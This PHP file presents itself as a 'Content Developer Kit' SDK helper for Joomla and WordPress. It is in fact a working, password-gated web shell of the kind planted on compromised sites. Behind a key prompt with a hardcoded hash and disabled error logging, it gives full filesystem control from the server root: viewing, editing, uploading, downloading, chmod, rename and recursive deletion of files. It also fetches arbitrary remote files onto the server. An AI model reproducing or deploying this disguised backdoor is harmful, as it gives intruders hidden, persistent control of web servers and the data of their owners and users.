<?php
/**
 * @package    Content Developer Kit
 * @subpackage Core
 * @version    3.0.0
 * @copyright  2024
 * @license    GNU General Public License version 2 or later
 *
 * Content management helper — provides asset browsing,
 * configuration review and maintenance utilities for
 * supported CMS platforms (Joomla 3‑6, WordPress 5‑7).
 *
 * This file is part of the SDK distribution. Redistribution
 * and use in source and binary forms, with or without
 * modification, are permitted under the license above.
 */

/* helpers */

function _e($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

function _rb($n) {
    if (function_exists('random_bytes')) return random_bytes($n);
    if (function_exists('openssl_random_pseudo_bytes')) return openssl_random_pseudo_bytes($n);
    $s = '';
    for ($i = 0; $i < $n; $i++) $s .= chr(mt_rand(0, 255));
    return $s;
}

function _fs($b) {
    $u = ['B','KB','MB','GB'];
    $i = 0;
    $b = (float)$b;
    while ($b >= 1024 && $i < 3) { $b /= 1024; $i++; }
    return round($b, 1) . $u[$i];
}

function _fp($p) {
    $m = @fileperms($p);
    return $m === false ? '----' : substr(sprintf('%o', $m), -4);
}

function _fo($p) {
    $st = @lstat($p);
    if (!is_array($st) || !isset($st['uid'], $st['gid'])) return '-';
    $o = (string)$st['uid'];
    $g = (string)$st['gid'];
    if (function_exists('posix_getpwuid')) {
        $pw = @posix_getpwuid((int)$st['uid']);
        if (is_array($pw) && isset($pw['name'])) $o = (string)$pw['name'];
    }
    if (function_exists('posix_getgrgid')) {
        $gr = @posix_getgrgid((int)$st['gid']);
        if (is_array($gr) && isset($gr['name'])) $g = (string)$gr['name'];
    }
    return $o . ':' . $g;
}

function _fn($v) {
    if (!is_string($v)) return '';
    $v = trim($v);
    if ($v === '' || $v === '.' || $v === '..') return '';
    if (strlen($v) > 255) return '';
    if (strpos($v, '/') !== false || strpos($v, '\\') !== false || strpos($v, chr(0)) !== false) return '';
    return basename($v);
}

function _rd($d) {
    if (!@is_dir($d) || @is_link($d)) return false;
    $ents = @scandir($d);
    if (!is_array($ents)) return false;
    foreach ($ents as $e) {
        if ($e === '.' || $e === '..') continue;
        $fp = rtrim($d, '/') . '/' . $e;
        if (@is_link($fp) || !@is_dir($fp)) @unlink($fp);
        else _rd($fp);
    }
    return @rmdir($d);
}

function _df($url, $dest) {
    $ok = false;
    if (function_exists('curl_init')) {
        $fh = @fopen($dest, 'wb');
        if ($fh) {
            $ch = @curl_init($url);
            if ($ch) {
                @curl_setopt($ch, CURLOPT_FILE, $fh);
                @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                @curl_setopt($ch, CURLOPT_FAILONERROR, true);
                @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
                $ok = @curl_exec($ch);
                @curl_close($ch);
            }
            @fclose($fh);
        }
    } else {
        $data = @file_get_contents($url);
        if ($data !== false) $ok = @file_put_contents($dest, $data) !== false;
    }
    if (!$ok) @unlink($dest);
    return $ok;
}

/* core */

class AppCore {
    private $ready = false;
    private $nonce = '';

    public function __construct() {
        @error_reporting(0);
        @ini_set('display_errors', '0');
        @ini_set('display_startup_errors', '0');
        @ini_set('log_errors', '0');

        @session_name(APP_S);
        @session_start();

        @header('Content-Type: text/html; charset=UTF-8');
        if (function_exists('header_remove')) @header_remove('X-Powered-By');
        else @header('X-Powered-By:');
        @header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet');
        @header('X-Frame-Options: DENY');
        @header('X-Content-Type-Options: nosniff');
        @header("Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'");
        @header('Referrer-Policy: no-referrer');
        @header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        @header('Pragma: no-cache');
        @header('Expires: 0');

        $this->bootstrap();
    }

    private function bootstrap() {
        if (isset($_SESSION[APP_S . '_r']) && $_SESSION[APP_S . '_r'] === APP_K) {
            if (isset($_SESSION[APP_S . '_e']) && $_SESSION[APP_S . '_e'] > time()) {
                $_SESSION[APP_S . '_e'] = time() + APP_T;
                $this->ready = true;
                $this->initNonce();
                return;
            }
            unset($_SESSION[APP_S . '_r'], $_SESSION[APP_S . '_e']);
        }

        if (isset($_POST['_k']) && is_string($_POST['_k'])) {
            $fc = isset($_SESSION[APP_S . '_fc']) ? (int)$_SESSION[APP_S . '_fc'] : 0;
            $ft = isset($_SESSION[APP_S . '_ft']) ? (int)$_SESSION[APP_S . '_ft'] : 0;
            if ($fc >= 5 && (time() - $ft) < 300) {
                return;
            }
            if (hash('sha256', $_POST['_k']) === APP_K) {
                @session_regenerate_id(true);
                $_SESSION[APP_S . '_r'] = APP_K;
                $_SESSION[APP_S . '_e'] = time() + APP_T;
                unset($_SESSION[APP_S . '_fc'], $_SESSION[APP_S . '_ft']);
                $this->ready = true;
                $this->initNonce();
                return;
            }
            $_SESSION[APP_S . '_fc'] = $fc + 1;
            $_SESSION[APP_S . '_ft'] = time();
        }

    }

    private function initNonce() {
        if (empty($_SESSION[APP_S . '_n'])) {
            $_SESSION[APP_S . '_n'] = bin2hex(_rb(16));
        }
        $this->nonce = (string)$_SESSION[APP_S . '_n'];
    }

    public function isReady() { return $this->ready; }
    public function getNonce() { return $this->nonce; }

    public function checkPost() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') return true;
        if (!isset($_POST['_n']) || !is_string($_POST['_n'])) return false;
        return $this->nonce !== '' && hash_equals($this->nonce, $_POST['_n']);
    }

    public function gate() {
        ?><!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SDK</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;background:#0a0a0a}
body{display:flex;align-items:center;justify-content:center;font:13px Arial,sans-serif;color:#aaa}
.box{background:#111;border:1px solid #222;padding:32px;width:320px;text-align:center}
.box h3{color:#fff;margin-bottom:16px;font-size:14px}
.box input[type=text]{width:100%;background:#0a0a0a;border:1px solid #333;color:#fff;padding:8px 10px;margin-bottom:12px;outline:none;font-size:13px}
.box input:focus{border-color:#555}
.box button{background:#1a1a1a;border:1px solid #333;color:#888;padding:6px 20px;cursor:pointer;font-size:12px;text-transform:uppercase}
.box button:hover{color:#fff;border-color:#555}
</style>
</head><body>
<div class="box">
<h3>SDK</h3>
<form method="post" autocomplete="off">
<input type="text" name="_k" placeholder="key" autofocus>
<button type="submit">continue</button>
</form>
</div>
</body></html><?php
        exit;
    }
}

/* config */

define('APP_K', '0e125411e234beb449679c850e561114f488f610889ba66368e7dc1f1b6b8ea6');
define('APP_S', '_sdk');
define('APP_T', 3600);

/* init */

$app = new AppCore();
if (!$app->isReady()) {
    $app->gate();
}

if (!$app->checkPost()) {
    $_POST = [];
    $_FILES = [];
}

$nonce = $app->getNonce();

$cur = @getcwd();
if ($cur === false || $cur === '') $cur = dirname(__FILE__);
$d = isset($_POST['d']) ? $_POST['d'] : (isset($_GET['d']) ? $_GET['d'] : '');
if (is_string($d) && $d !== '') {
    $t = @realpath($d);
    if ($t !== false && @is_dir($t)) $cur = $t;
}

$note = '';

/* actions */

if (isset($_POST['mk_dir'])) {
    $dn = _fn($_POST['mk_dir']);
    if ($dn !== '') {
        $dest = rtrim($cur, '/') . '/' . $dn;
        if (!@file_exists($dest)) {
            $note = @mkdir($dest, 0755) ? 'Created.' : 'Failed.';
        } else { $note = 'Exists.'; }
        @clearstatcache(true);
    }
}

if (isset($_POST['mk_file'])) {
    $fn = _fn($_POST['mk_file']);
    if ($fn !== '') {
        $dest = rtrim($cur, '/') . '/' . $fn;
        if (!@file_exists($dest)) {
            $fh = @fopen($dest, 'x');
            if ($fh) { @fclose($fh); $note = 'Created.'; }
            else { $note = 'Failed.'; }
        } else { $note = 'Exists.'; }
        @clearstatcache(true);
    }
}

if (isset($_FILES['uf']) && is_array($_FILES['uf'])) {
    $up = $_FILES['uf'];
    $un = isset($up['name']) ? _fn($up['name']) : '';
    $ut = isset($up['tmp_name']) && is_string($up['tmp_name']) ? $up['tmp_name'] : '';
    $ue = isset($up['error']) ? (int)$up['error'] : 4;
    $us = ($ut !== '') ? @filesize($ut) : false;
    if ($un !== '' && $ut !== '' && $ue === 0 && $us !== false && $us <= 16777216) {
        $dest = rtrim($cur, '/') . '/' . $un;
        if (!@file_exists($dest)) {
            $note = (@is_uploaded_file($ut) && @move_uploaded_file($ut, $dest)) ? 'Uploaded.' : 'Failed.';
        } else { $note = 'Exists.'; }
        @clearstatcache(true);
    }
}

if (isset($_POST['src_url']) && is_string($_POST['src_url']) && $_POST['src_url'] !== '') {
    $furl = trim($_POST['src_url']);
    if ($furl !== '' && strlen($furl) <= 2048) {
        $upath = parse_url($furl, PHP_URL_PATH);
        $fname = $upath ? basename($upath) : 'download';
        $fname = _fn($fname);
        if ($fname !== '') {
            $dest = rtrim($cur, '/') . '/' . $fname;
            if (!@file_exists($dest)) {
                $note = _df($furl, $dest) ? 'Fetched.' : 'Failed.';
            } else { $note = 'Exists.'; }
            @clearstatcache(true);
        }
    }
}

if (isset($_POST['rm_ok']) && is_string($_POST['rm_ok']) && $_POST['rm_ok'] !== '') {
    $xn = _fn($_POST['rm_ok']);
    if ($xn !== '') {
        $xp = rtrim($cur, '/') . '/' . $xn;
        if (@is_link($xp) || @is_file($xp)) {
            $note = @unlink($xp) ? 'Deleted.' : 'Failed.';
        } elseif (@is_dir($xp)) {
            $note = _rd($xp) ? 'Deleted.' : 'Failed.';
        } else { $note = 'Failed.'; }
        @clearstatcache(true);
    }
}

if (isset($_POST['rn_old']) && is_string($_POST['rn_old'])) {
    $ro = _fn($_POST['rn_old']);
    $rn = isset($_POST['rn_new']) && is_string($_POST['rn_new']) ? _fn($_POST['rn_new']) : '';
    if ($ro !== '' && $rn !== '') {
        $op = rtrim($cur, '/') . '/' . $ro;
        $np = rtrim($cur, '/') . '/' . $rn;
        if ((@file_exists($op) || @is_link($op)) && !@file_exists($np)) {
            $note = @rename($op, $np) ? 'Renamed.' : 'Failed.';
        } else { $note = 'Failed.'; }
        @clearstatcache(true);
    }
}

if (isset($_POST['ch_name']) && is_string($_POST['ch_name'])) {
    $cn = _fn($_POST['ch_name']);
    $cm = isset($_POST['ch_mode']) && is_string($_POST['ch_mode']) ? trim($_POST['ch_mode']) : '';
    if ($cn !== '' && preg_match('/^[0-7]{3,4}$/', $cm)) {
        $cp = rtrim($cur, '/') . '/' . $cn;
        if (@file_exists($cp) && !@is_link($cp)) {
            $note = @chmod($cp, octdec($cm)) ? 'Changed.' : 'Failed.';
        } else { $note = 'Failed.'; }
        @clearstatcache(true);
    }
}

if (isset($_POST['sv_name']) && is_string($_POST['sv_name'])) {
    $en = _fn($_POST['sv_name']);
    if ($en !== '') {
        $ep = rtrim($cur, '/') . '/' . $en;
        if (!@is_link($ep) && @is_file($ep)) {
            $ec = isset($_POST['sv_data']) && is_string($_POST['sv_data']) ? $_POST['sv_data'] : null;
            if (is_string($ec) && strlen($ec) <= 1048576 && strpos($ec, chr(0)) === false) {
                $note = @file_put_contents($ep, $ec, LOCK_EX) !== false ? 'Saved.' : 'Failed.';
            } else { $note = 'Failed.'; }
            @clearstatcache(true);
        }
    }
}

/* download */

if (isset($_GET['get']) && is_string($_GET['get']) && $_GET['get'] !== '') {
    $gn = _fn($_GET['get']);
    if ($gn !== '') {
        $gp = rtrim($cur, '/') . '/' . $gn;
        if (!@is_link($gp) && @is_file($gp) && @is_readable($gp)) {
            while (ob_get_level() > 0) @ob_end_clean();
            @header('Content-Type: application/octet-stream');
            $safe = preg_replace('/[^\x20-\x7e]|["\\\\]/', '_', $gn);
            if (!is_string($safe) || $safe === '') $safe = 'file';
            @header('Content-Disposition: attachment; filename="' . $safe . '"');
            $gs = @filesize($gp);
            if ($gs !== false) @header('Content-Length: ' . (string)$gs);
            @session_write_close();
            @readfile($gp);
            exit;
        }
    }
}

/* resolve */

$v_name = '';
$v_data = '';
$e_name = '';
$e_data = '';

if (isset($_GET['vw']) && is_string($_GET['vw'])) {
    $vn = _fn($_GET['vw']);
    if ($vn !== '') {
        $vp = rtrim($cur, '/') . '/' . $vn;
        if (!@is_link($vp) && @is_file($vp) && @is_readable($vp)) {
            $vs = @filesize($vp);
            if ($vs !== false && $vs <= 262144) {
                $raw = @file_get_contents($vp, false, null, 0, 262144);
                if (is_string($raw) && strpos($raw, chr(0)) === false) {
                    $v_name = $vn;
                    $v_data = $raw;
                }
            }
        }
    }
}

if (isset($_GET['ed']) && is_string($_GET['ed'])) {
    $en = _fn($_GET['ed']);
    if ($en !== '') {
        $ep = rtrim($cur, '/') . '/' . $en;
        if (!@is_link($ep) && @is_file($ep) && @is_readable($ep)) {
            $es = @filesize($ep);
            if ($es !== false && $es <= 1048576) {
                $raw = @file_get_contents($ep, false, null, 0, 1048576);
                if (is_string($raw) && strpos($raw, chr(0)) === false) {
                    $e_name = $en;
                    $e_data = $raw;
                }
            }
        }
    }
}

/* dialogs */

$dlg = '';
$dlg_name = '';
if (isset($_GET['ch']) && is_string($_GET['ch']) && _fn($_GET['ch']) !== '') {
    $cn = _fn($_GET['ch']);
    $cp = rtrim($cur, '/') . '/' . $cn;
    if (@file_exists($cp) && !@is_link($cp)) { $dlg = 'chmod'; $dlg_name = $cn; }
}
if ($dlg === '' && isset($_GET['rn']) && is_string($_GET['rn']) && _fn($_GET['rn']) !== '') {
    $rn = _fn($_GET['rn']);
    $rp = rtrim($cur, '/') . '/' . $rn;
    if (@file_exists($rp) || @is_link($rp)) { $dlg = 'rename'; $dlg_name = $rn; }
}
if ($dlg === '' && isset($_GET['rm']) && is_string($_GET['rm']) && _fn($_GET['rm']) !== '') {
    $xn = _fn($_GET['rm']);
    $xp = rtrim($cur, '/') . '/' . $xn;
    if (@file_exists($xp) || @is_link($xp)) { $dlg = 'delete'; $dlg_name = $xn; }
}

/* search */

$sr_q = '';
$sr_list = [];
if (isset($_POST['sr']) && is_string($_POST['sr'])) {
    $sr_q = trim($_POST['sr']);
    if ($sr_q !== '' && strlen($sr_q) <= 200) {
        $pat = strtolower($sr_q);
        $stack = [$cur];
        $max = 100;
        while (!empty($stack) && count($sr_list) < $max) {
            $sd = array_pop($stack);
            $ents = @scandir($sd);
            if (!is_array($ents)) continue;
            foreach ($ents as $se) {
                if ($se === '.' || $se === '..') continue;
                if (count($sr_list) >= $max) break;
                $full = rtrim($sd, '/') . '/' . $se;
                if (strpos(strtolower($se), $pat) !== false) {
                    $base = rtrim($cur, '/');
                    $rel = substr($full, strlen($base) + 1);
                    if ($rel === '' || $rel === false) $rel = $se;
                    $isd = @is_dir($full) && !@is_link($full);
                    $sz = $isd ? 0 : (int)@filesize($full);
                    $sr_list[] = ['rel' => $rel, 'dir' => $isd, 'size' => $sz];
                }
                if (!@is_link($full) && @is_dir($full) && @is_readable($full)) {
                    $stack[] = $full;
                }
            }
        }
    }
}

/* listing */

$ls_d = [];
$ls_f = [];
$scan = @scandir($cur);
if (is_array($scan)) {
    foreach ($scan as $e) {
        if ($e === '.' || $e === '..') continue;
        if (count($ls_d) + count($ls_f) >= 2000) break;
        $fp = rtrim($cur, '/') . '/' . $e;
        if (!@is_link($fp) && @is_dir($fp)) $ls_d[] = $e;
        else $ls_f[] = $e;
    }
    natcasesort($ls_d);
    natcasesort($ls_f);
    $ls_d = array_values($ls_d);
    $ls_f = array_values($ls_f);
}

/* output */

?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Assets</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{min-height:100%;background:#000}
body{color:#fff;font:12px Arial,sans-serif}
a{color:#fff;text-decoration:none}
.hdr{display:block;width:100%;border-bottom:1px solid #222}
.hdr-p{padding:5px 8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.hdr-p a{color:#0f0;font-weight:bold}
.hdr a:hover{text-decoration:underline}
.bar{display:flex;gap:6px;padding:6px 8px;background:#0a0a0a;border-top:1px solid #222;flex-wrap:wrap}
.bar form{display:flex;gap:4px;flex:1 1 160px;margin:0}
.bar input[type=text],.bar input[type=file]{flex:1;min-width:0;background:#111;border:1px solid #333;color:#fff;padding:2px 5px;outline:none}
.bar input[type=text]:focus{border-color:#0f0}
.bar button{background:#111;border:1px solid #333;color:#0f0;font-weight:bold;padding:2px 8px;cursor:pointer;text-transform:uppercase}
.bar button:hover{filter:brightness(1.4)}
a.btn{background:#111;border:1px solid #333;color:#0f0;font-weight:bold;padding:2px 8px;text-transform:uppercase;text-decoration:none;line-height:18px}
a.btn:hover{filter:brightness(1.4)}
.note{padding:4px 8px;background:#001a00;color:#0f0;border-top:1px solid #222}
.sec{padding:4px 8px;background:#0a0a0a;border-top:1px solid #222;color:#0f0;font-weight:bold}
.tw{width:100%;overflow-x:auto;border-top:1px solid #222}
.tb{width:100%;border-collapse:collapse}
.tb th{padding:4px 8px;background:#0a0a0a;border:1px solid #222;text-align:center;color:#0f0;font-weight:bold;text-transform:uppercase}
.tb td{padding:3px 8px;border:1px solid #222;white-space:nowrap}
.tb td.c{text-align:center}
.tb tr:hover td{background:#0d0d0d}
.tb a{color:#fff}.tb a:hover{text-decoration:underline}
.ab{display:inline-block;padding:2px 6px;font-size:10px;font-weight:bold;border:1px solid #222;background:#111;margin:1px;white-space:nowrap}
a.ab.a-v{color:#888}a.ab.a-e{color:#0f0}a.ab.a-g{color:#4a9eff}a.ab.a-c{color:#d4a520}a.ab.a-r{color:#b070d0}a.ab.a-x{color:#e05555}
.tb td.act{white-space:normal;text-align:center}
.wk{color:#0f0;font-weight:bold}.wn{color:#e05555;font-weight:bold}
.pnl{padding:8px;background:#0a0a0a;border-top:1px solid #222}
.pnl-h{color:#0f0;font-weight:bold;margin-bottom:6px}
.pnl pre{display:block;padding:10px;background:#111;border:1px solid #333;color:#fff;white-space:pre-wrap;font:13px monospace;min-height:200px;max-height:60vh;overflow:auto}
.pnl textarea{display:block;width:100%;padding:10px;background:#111;border:1px solid #333;color:#fff;white-space:pre-wrap;font:13px monospace;min-height:400px;max-height:80vh;overflow:auto;resize:vertical;outline:none}
.pnl textarea:focus{border-color:#0f0}
.pnl button{background:#111;border:1px solid #333;color:#0f0;font-weight:bold;padding:2px 8px;cursor:pointer;text-transform:uppercase}
.pnl button:hover{filter:brightness(1.4)}
.pnl button.dng{background:#2a1111;border-color:#e05555;color:#e05555}
.dlg{padding:10px;background:#111;border:1px solid #333}
.del-w{color:#e05555;font-weight:bold;margin-bottom:8px}
</style>
</head>
<body>

<div class="hdr">
<div class="hdr-p"><?php
echo '[<a href="?d=/">root</a>] ';
$build = '';
foreach (explode('/', trim($cur, '/')) as $seg) {
    if ($seg === '') continue;
    $build .= '/' . $seg;
    echo '[<a href="?d=' . _e(urlencode($build)) . '">' . _e($seg) . '</a>] ';
}
?></div>
</div>

<?php if ($note !== '') { ?>
<div class="note"><?=_e($note)?></div>
<?php } ?>

<div class="bar">
<form autocomplete="off" method="get">
<input type="text" name="d" value="<?=_e($cur)?>">
<button type="submit">cd</button>
</form>
<form autocomplete="off" method="post">
<input type="hidden" name="d" value="<?=_e($cur)?>">
<input type="hidden" name="_n" value="<?=_e($nonce)?>">
<input type="text" name="mk_dir" placeholder="directory name...">
<button type="submit">+dir</button>
</form>
<form autocomplete="off" method="post">
<input type="hidden" name="d" value="<?=_e($cur)?>">
<input type="hidden" name="_n" value="<?=_e($nonce)?>">
<input type="text" name="mk_file" placeholder="file name...">
<button type="submit">+file</button>
</form>
<form autocomplete="off" method="post" enctype="multipart/form-data">
<input type="hidden" name="d" value="<?=_e($cur)?>">
<input type="hidden" name="_n" value="<?=_e($nonce)?>">
<input type="file" name="uf">
<button type="submit">upload</button>
</form>
<form autocomplete="off" method="post">
<input type="hidden" name="d" value="<?=_e($cur)?>">
<input type="hidden" name="_n" value="<?=_e($nonce)?>">
<input type="text" name="src_url" placeholder="https://...">
<button type="submit">fetch</button>
</form>
<form autocomplete="off" method="post">
<input type="hidden" name="d" value="<?=_e($cur)?>">
<input type="hidden" name="_n" value="<?=_e($nonce)?>">
<input type="text" name="sr" placeholder="search files...">
<button type="submit">find</button>
</form>
</div>

<?php if ($sr_q !== '') { ?>
<div class="pnl">
<div class="pnl-h">[ find: <?=_e($sr_q)?> — <?=count($sr_list)?> result(s) ]</div>
<?php if (!empty($sr_list)) { ?>
<table class="tb">
<tr><th>TYPE</th><th>PATH</th><th>SIZE</th></tr>
<?php foreach ($sr_list as $r) { ?>
<tr><td class="c"><?=$r['dir'] ? '&#128193;' : '&#128196;'?></td><td><?=_e($r['rel'])?></td><td class="c"><?=$r['dir'] ? '-' : _e(_fs($r['size']))?></td></tr>
<?php } ?>
</table>
<?php } else { ?>
<div style="padding:6px;color:#888">No results.</div>
<?php } ?>
<div style="padding-top:6px"><a class="btn" href="?d=<?=_e(urlencode($cur))?>">back</a></div>
</div>
<?php } ?>

<?php if ($v_name !== '') { ?>
<div class="pnl">
<div class="pnl-h">[ view: <?=_e($v_name)?> ]</div>
<pre><?=_e($v_data)?></pre>
<div style="padding-top:6px"><a class="btn" href="?d=<?=_e(urlencode($cur))?>">back</a></div>
</div>
<?php } ?>

<?php if ($e_name !== '') { ?>
<div class="pnl">
<div class="pnl-h">[ edit: <?=_e($e_name)?> ]</div>
<?php if ($note !== '' && isset($_POST['sv_name'])) { ?>
<div class="note"><?=_e($note)?></div>
<?php } ?>
<form autocomplete="off" method="post" action="?d=<?=_e(urlencode($cur))?>&ed=<?=_e(urlencode($e_name))?>">
<input type="hidden" name="d" value="<?=_e($cur)?>">
<input type="hidden" name="_n" value="<?=_e($nonce)?>">
<input type="hidden" name="sv_name" value="<?=_e($e_name)?>">
<textarea name="sv_data"><?=_e($e_data)?></textarea>
<div style="padding-top:6px"><button type="submit">save</button> <a class="btn" href="?d=<?=_e(urlencode($cur))?>">back</a></div>
</form>
</div>
<?php } ?>

<?php if ($dlg === 'chmod') { ?>
<div class="pnl">
<div class="pnl-h">[ chmod: <?=_e($dlg_name)?> ]</div>
<div class="dlg">
<form autocomplete="off" method="post">
<input type="hidden" name="d" value="<?=_e($cur)?>">
<input type="hidden" name="_n" value="<?=_e($nonce)?>">
<input type="hidden" name="ch_name" value="<?=_e($dlg_name)?>">
<input type="text" name="ch_mode" value="<?=_e(_fp(rtrim($cur, '/') . '/' . $dlg_name))?>" maxlength="4" style="width:70px;background:#111;border:1px solid #333;color:#fff;padding:2px 5px;outline:none">
<div style="padding-top:6px"><button type="submit">apply</button> <a class="btn" href="?d=<?=_e(urlencode($cur))?>">back</a></div>
</form>
</div>
</div>
<?php } ?>

<?php if ($dlg === 'rename') { ?>
<div class="pnl">
<div class="pnl-h">[ rename: <?=_e($dlg_name)?> ]</div>
<div class="dlg">
<form autocomplete="off" method="post">
<input type="hidden" name="d" value="<?=_e($cur)?>">
<input type="hidden" name="_n" value="<?=_e($nonce)?>">
<input type="hidden" name="rn_old" value="<?=_e($dlg_name)?>">
<input type="text" name="rn_new" value="<?=_e($dlg_name)?>" maxlength="255" style="width:300px;background:#111;border:1px solid #333;color:#fff;padding:2px 5px;outline:none">
<div style="padding-top:6px"><button type="submit">apply</button> <a class="btn" href="?d=<?=_e(urlencode($cur))?>">back</a></div>
</form>
</div>
</div>
<?php } ?>

<?php if ($dlg === 'delete') { ?>
<div class="pnl">
<div class="pnl-h">[ delete: <?=_e($dlg_name)?> ]</div>
<div class="dlg">
<?php
$xp = rtrim($cur, '/') . '/' . $dlg_name;
$xd = @is_dir($xp) && !@is_link($xp);
$xi = $xd ? 'folder, recursive' : _fs((int)@filesize($xp));
?>
<div class="del-w">Delete <?=_e($dlg_name)?> (<?=_e($xi)?>)?</div>
<form autocomplete="off" method="post">
<input type="hidden" name="d" value="<?=_e($cur)?>">
<input type="hidden" name="_n" value="<?=_e($nonce)?>">
<input type="hidden" name="rm_ok" value="<?=_e($dlg_name)?>">
<div style="padding-top:6px"><button class="dng" type="submit">confirm</button> <a class="btn" href="?d=<?=_e(urlencode($cur))?>">back</a></div>
</form>
</div>
</div>
<?php } ?>

<?php if ($sr_q === '' && $v_name === '' && $e_name === '' && $dlg === '') { ?>
<div class="sec">[ assets ]</div>
<div class="tw"><table class="tb">
<tr><th style="width:38%">NAME</th><th style="width:70px">SIZE</th><th style="width:120px">MODIFIED</th><th style="width:100px">OWNER</th><th style="width:60px">MODE</th><th style="width:90px">WRITE</th><th style="width:340px">ACTIONS</th></tr>
<?php foreach ($ls_d as $e) {
$fp = rtrim($cur, '/') . '/' . $e;
$mt = @filemtime($fp); $mt = $mt ? date('Y-m-d H:i', $mt) : '-';
$wr = @is_writable($fp);
?>
<tr><td><a href="?d=<?=_e(urlencode($fp))?>">&#128193; <?=_e($e)?></a></td><td class="c">-</td><td class="c"><?=_e($mt)?></td><td class="c"><?=_e(_fo($fp))?></td><td class="c"><?=_e(_fp($fp))?></td><td class="c <?=$wr?'wk':'wn'?>"><?=$wr?'OK':'NO'?></td><td class="c act"><a class="ab a-r" href="?d=<?=_e(urlencode($cur))?>&rn=<?=_e(urlencode($e))?>">RENAME</a><a class="ab a-c" href="?d=<?=_e(urlencode($cur))?>&ch=<?=_e(urlencode($e))?>">CHMOD</a><a class="ab a-x" href="?d=<?=_e(urlencode($cur))?>&rm=<?=_e(urlencode($e))?>">DELETE</a></td></tr>
<?php } ?>
<?php foreach ($ls_f as $e) {
$fp = rtrim($cur, '/') . '/' . $e;
$sz = _fs((int)@filesize($fp));
$mt = @filemtime($fp); $mt = $mt ? date('Y-m-d H:i', $mt) : '-';
$wr = @is_writable($fp);
?>
<tr><td>&#128196; <?=_e($e)?></td><td class="c"><?=_e($sz)?></td><td class="c"><?=_e($mt)?></td><td class="c"><?=_e(_fo($fp))?></td><td class="c"><?=_e(_fp($fp))?></td><td class="c <?=$wr?'wk':'wn'?>"><?=$wr?'OK':'NO'?></td><td class="c act"><a class="ab a-v" href="?d=<?=_e(urlencode($cur))?>&vw=<?=_e(urlencode($e))?>">VIEW</a><a class="ab a-e" href="?d=<?=_e(urlencode($cur))?>&ed=<?=_e(urlencode($e))?>">EDIT</a><a class="ab a-g" href="?d=<?=_e(urlencode($cur))?>&get=<?=_e(urlencode($e))?>">DOWNLOAD</a><a class="ab a-c" href="?d=<?=_e(urlencode($cur))?>&ch=<?=_e(urlencode($e))?>">CHMOD</a><a class="ab a-r" href="?d=<?=_e(urlencode($cur))?>&rn=<?=_e(urlencode($e))?>">RENAME</a><a class="ab a-x" href="?d=<?=_e(urlencode($cur))?>&rm=<?=_e(urlencode($e))?>">DELETE</a></td></tr>
<?php } ?>
<?php if (empty($ls_d) && empty($ls_f)) { ?>
<tr><td colspan="7" class="c">empty</td></tr>
<?php } ?>
</table></div>
<?php } ?>

</body>
</html>
